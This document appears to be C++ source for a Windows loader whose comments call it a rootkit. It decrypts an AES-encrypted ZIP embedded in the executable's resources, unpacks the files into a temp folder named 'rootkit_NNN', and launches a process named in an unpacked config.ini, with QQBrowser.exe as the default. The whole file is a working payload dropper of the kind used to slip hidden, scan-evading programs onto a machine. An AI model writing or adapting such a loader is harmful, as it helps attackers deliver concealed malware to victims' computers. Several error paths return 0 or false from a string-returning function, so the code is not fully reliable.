// loader.cpp : Defines the entry point for the application.
//
#include "stdafx.h"
#include "resource.h"
#include "AESEncryption.h"
#include "zip\unzip.h"
#include "loaderUtils.h"

#include <string>
#include <Shlwapi.h>

#pragma comment(lib,"Shlwapi.lib")

// Release all the programs in resource section to temp directory and run it.
std::wstring releaseFilesFromResource(HINSTANCE hInstance) {
	// Determines the location of a resource with the specified type and name in the specified module.
	// https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-findresourcea
	HRSRC hResInfo = FindResource(hInstance, MAKEINTRESOURCE(IDR_MAGIC2), _T("magic"));
	if (hResInfo == NULL) {
		DebugOutputMsg(_T("FindResource failed, lastError=%d"), GetLastError());
		return 0;
	}

	// Retrieves a handle that can be used to obtain a pointer to the first byte of the specified resource in memory.
	// https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource
	// Rootkit-Resoure-todo: 
	HGLOBAL hRes = LoadResource(hInstance, hResInfo);
	if (hRes == NULL) {
		DebugOutputMsg(_T("LoadResource failed, lastError=%d"), GetLastError());
		return 0;
	}

	// Retrieves a pointer to the specified resource in memory.
	// The pointer returned by LockResource is valid until the module containing the resource is unloaded. 
	// https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-lockresource
	// Rootkit-Resoure-todo:
	LPVOID Data = LockResource(hRes);
	
	// Retrieves the size, in bytes, of the specified resource.
	// https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-sizeofresource
	// Rootkit-Resoure-todo:
	DWORD nSize = SizeofResource(hInstance, hResInfo);

	// decrypt the data in resource section.
	BYTE* lpData = new BYTE[nSize];
	ZeroMemory(lpData, nSize*sizeof(BYTE));
	CAESEncryption aes;
	if (false == aes.Decryption(Data, nSize, lpData)) {
		DebugOutputMsg(_T("Decryption failed, lastError=%d"), GetLastError());
		return false;
	}
		

	// This function is provided only for compatibility with 16-bit versions of Windows. 
	// It is not necessary for Win32-based applications to unlock resources.
	UnlockResource(hRes);
	// Decrements (decreases by one) the reference count of a loaded resource. 
	// When the reference count reaches zero, the memory occupied by the resource is freed.
	FreeResource(hRes);

	
	TCHAR tempPath[MAX_PATH] = { 0 };
	TCHAR tempDir[MAX_PATH] = { 0 };
	// Retrieves the contents of the specified variable from the environment block of the calling process.
	// https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getenvironmentvariable
	GetEnvironmentVariable(_T("TEMP"), tempPath, MAX_PATH);
	BOOL bStop = FALSE;
	while (!bStop)
	{
		static int index = 0;
		_stprintf_s(tempDir, _T("%s\\rootkit_%03d\\"), tempPath, index);
		if (CLoaderUtils::IsDirectory(tempDir))
		{
			++index;
			continue;
		}
		::CreateDirectory(tempDir, NULL);
		if (!CLoaderUtils::IsDirectory(tempDir))
			continue;

		bStop = TRUE;
	}

	// Open as a ZIP file and return a NUll handle if the data is invalid.
	// opens a zip file and returns a handle with which you can subsequently examine its contents
	HZIP hZip = OpenZip(lpData, nSize, NULL);
	// if unzipping to a filename, and it's a relative filename, then it will be relative to here.
	// (defaults to current-directory).
	SetUnzipBaseDir(hZip, _T("\\"));
	ZIPENTRY ze;
	// call this to get information about an item in the zip.
	GetZipItem(hZip, -1, &ze);
	int numitems = ze.index;	//文件数量
	UINT ExeNum = 0;
	for (int zi = 0; zi < numitems; zi++)
	{
		// call this to get information about an item in the zip.
		GetZipItem(hZip, zi, &ze);

		TCHAR file_name[MAX_PATH] = { 0 };		//保存文件名
		_stprintf_s(file_name, _T("%s%s"), tempDir, ze.name);

		//  given an index to an item, unzips it.
		ZRESULT ret = UnzipItem(hZip, zi, file_name);
		while (ret != 0)
		{
			ret = UnzipItem(hZip, zi, file_name);
		}
	}

	// close zip handle.
	CloseZip(hZip);

	return tempDir;
}

int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPTSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	// Release all the programs in resource section to temp directory and run it.
	std::wstring fileDir = releaseFilesFromResource(hInstance);

	std::wstring str_config = fileDir + _T("config.ini");
	TCHAR szBuffer[MAX_PATH] = { 0 };
	// Retrieves a string from the specified section in an initialization file.
	// https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getprivateprofilestring
	GetPrivateProfileString(_T("data"), _T("start_process"), _T("QQBrowser.exe"), szBuffer, MAX_PATH, str_config.c_str());
	OutputDebugString(szBuffer);
	std::wstring strStartProcess = fileDir + szBuffer;
	OutputDebugString(strStartProcess.c_str());
	if (PathFileExists(strStartProcess.c_str()))
	{
		// execute the process.
		CLoaderUtils::Execute(strStartProcess.c_str(), _T(""), fileDir.c_str(), FALSE, TRUE);
	}
	
	return 0;
}
